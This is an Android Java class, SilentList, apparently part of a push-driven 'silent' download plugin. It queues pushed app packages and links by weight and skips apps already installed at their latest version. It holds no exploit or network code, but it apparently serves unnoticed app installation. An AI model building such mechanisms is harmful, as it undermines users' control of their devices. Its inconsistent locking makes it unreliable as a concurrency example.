package com.tiho.dlplugin.task.silent;

import android.content.Context;
import android.text.TextUtils;

import com.tiho.base.common.LogManager;
import com.tiho.dlplugin.bean.PushLinkBean;
import com.tiho.dlplugin.bean.PushSilentBean;
import com.tiho.dlplugin.bean.Resource;
import com.tiho.dlplugin.dao.DAOFactory;
import com.tiho.dlplugin.task.silent.dao.IndepentSilnetDAO;
import com.tiho.dlplugin.util.PackageUtil;

import java.util.Collections;
import java.util.Comparator;
import java.util.LinkedList;
import java.util.List;

public class SilentList implements Comparator<Resource> {

    private static SilentList instance;
    private List<Resource> silentList;
    private Object lock;
    private Context context;

    private SilentList(Context context) {
        super();
        lock = new Object();
        this.context = context;
        // 加载文件中的静默消息
        loadFromFile();
    }

    public synchronized static SilentList getInstance(Context context) {
        if (instance == null)
            instance = new SilentList(context);

        return instance;
    }

    public void await() {
        synchronized (lock) {
            try {
                lock.wait();
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    public boolean isEmpty() {
        synchronized (silentList) {
            return silentList.isEmpty();
        }
    }

    public String getDumpName() {
        synchronized (silentList) {
            if (silentList.isEmpty())
                return null;
            else {
                Resource resource = silentList.get(0);
                if (resource != null) {
                    return resource.getResourceName();
                }
                return null;
            }
        }
    }

    private void note() {
        synchronized (lock) {
            lock.notifyAll();
        }
    }

    public void addSilent(List<Resource> ps) {
        synchronized (silentList) {
            // 先清空原来的列表
            silentList.clear();

            for (Resource resource : ps) {
                silentList.add(resource);
            }
            // 排序
            Collections.sort(silentList, this);


            if (LogManager.debugOpen) {
                LogManager.LogShow("静默连接排序结果");
                for (Resource resource : silentList) {
                    LogManager.LogShow(resource.toString());
                }
            }

        }
        // 通知
        note();
    }

    public Resource dump() {
        while (silentList.isEmpty())
            await();

        return silentList.get(0);
    }


    /**
     * 移除
     *
     * @param msg
     */
    public void consumed(Resource msg) {
        synchronized (lock) {
            if (!silentList.isEmpty()) {
                boolean b = silentList.remove(msg);
                LogManager.LogShow("移除静默下载队列结果：" + b);
            }
        }
    }

    public Resource getById(long id) {
        synchronized (silentList) {
            for (Resource ps : silentList) {
                if (ps.getResourceId() == id)
                    return ps;
            }
            return null;
        }
    }

    private void loadFromFile() {
        silentList = new LinkedList<Resource>();

        IndepentSilnetDAO dao = DAOFactory.getIndepentSilnetDAO(context);
        List<Resource> store;
        try {
            store = dao.getPushMessage();
            for (Resource resource : store) {
                if (resource instanceof PushSilentBean) {
                    PushSilentBean silentBean= (PushSilentBean) resource;
                    if(PackageUtil.isInstalled(resource.getResourceName(), context)
                            &&PackageUtil.isLatestVersion(silentBean.getMd5(),resource.getResourceName(), context)){
                        LogManager.LogShow("pack Installed or is LatestVersion"+resource.getResourceName());
                    }else{//没有安装或者不是最新版本
                        silentList.add(resource);
                    }
                }else if(resource instanceof PushLinkBean){
                    if(!TextUtils.isEmpty(resource.getResourceUrl())){
                        silentList.add(resource);
                    }
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }


        Collections.sort(silentList, this);

        if (LogManager.debugOpen) {
            LogManager.LogShow("静默连接排序结果");
            for (Resource resource : silentList) {
                LogManager.LogShow(resource.toString());
            }
        }
    }

    /**
     * 对silentList进行排序 weight大 优先
     * weight相同的，id大的优先
     *
     * @author jerry.zhou
     */

    @Override
    public int compare(Resource a, Resource b) {
        int compareResult = b.getResourceWeight() - a.getResourceWeight();
        if (compareResult == 0) {
            compareResult = (int) (b.getResourceId() - a.getResourceId());
        }
        return compareResult;
    }

}
